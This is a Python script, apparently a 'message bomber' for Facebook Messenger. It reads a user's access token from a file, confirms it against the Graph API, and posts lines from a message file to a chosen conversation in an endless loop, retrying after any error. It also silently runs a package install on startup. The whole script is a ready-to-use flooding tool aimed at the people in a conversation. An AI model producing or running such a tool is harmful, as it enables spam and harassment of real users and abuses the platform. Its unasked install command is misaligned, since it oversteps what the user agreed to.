#!/usr/bin/python3
# -*- coding:utf-8 -*-
import os, time, random, string, re, sys, requests, json, uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool

try:
    os.system("pkg install espeak")
except:
    pass

from platform import system

# Function definitions
def testPY():
    if sys.version_info[0] < 3:
        print('\n\t [+] You have Python 2, please update to Python 3.\n')
        sys.exit()

def cls():
    os.system('clear' if system() == 'Linux' else 'cls')

# Print Logo
def logo():
    logo_text = """

  \033[1;32m██╗  ██╗██╗ ██████╗██╗  ██╗
  \033[1;39m██║ ██╔╝██║██╔════╝██║ ██╔╝
  \033[1;35m█████╔╝ ██║██║     █████╔╝ 
  \033[1;33m██╔═██╗ ██║██║     ██╔═██╗ 
  \033[1;36m██║  ██╗██║╚██████╗██║  ██╗
  \033[1;34m╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝
                           
                           
    """
    print(logo_text)
    time.sleep(0.07)

# Infinite Messaging Loop
def message_on_messenger(message, ns, thread_id, access_token, timm):
    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv)',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    }

    while True:  # Infinite loop
        for i in ns:
            try:
                message = str(message) + i.strip()
                url = f"https://graph.facebook.com/v15.0/t_{thread_id}/"
                parameters = {'access_token': access_token, 'message': message}
                s = requests.post(url, data=parameters, headers=headers)

                if s.ok:
                    print(f"Message Sent: {message}")
                else:
                    print('Error sending message, retrying after delay...')
                time.sleep(timm)  # Control message sending rate

            except Exception as e:
                print("Exception occurred:", e)
                time.sleep(30)  # Wait before retrying after an error

# Main program
def main():
    testPY()
    cls()
    logo()

    token = input("[+] Input Token File Name: ")
    with open(token, 'r') as f:
        access_token = f.read().strip()

    # Fetch user profile name for confirmation
    profile_data = requests.get(f"https://graph.facebook.com/v15.0/me?access_token={access_token}").json()
    if 'name' not in profile_data:
        print('\033[1;31mInvalid Token!\033[0m')
        sys.exit()

    # User input for other settings
    print(f"\033[1;32mYour Profile Name: {profile_data['name']}\033[0m")
    thread_id = input("\033[1;36mConservation ID: \033[0m")
    message = input("\033[1;36mEnter Message Prefix: \033[0m")
    file_name = input("\033[1;36mAdd Message File Name: \033[0m")
    timm = int(input("\033[1;36mMessage Send Interval (seconds): \033[0m"))

    # Load messages from the file
    with open(file_name, 'r') as f:
        ns = f.readlines()

    # Start the infinite messaging loop
    message_on_messenger(message, ns, thread_id, access_token, timm)

if __name__ == "__main__":
    main()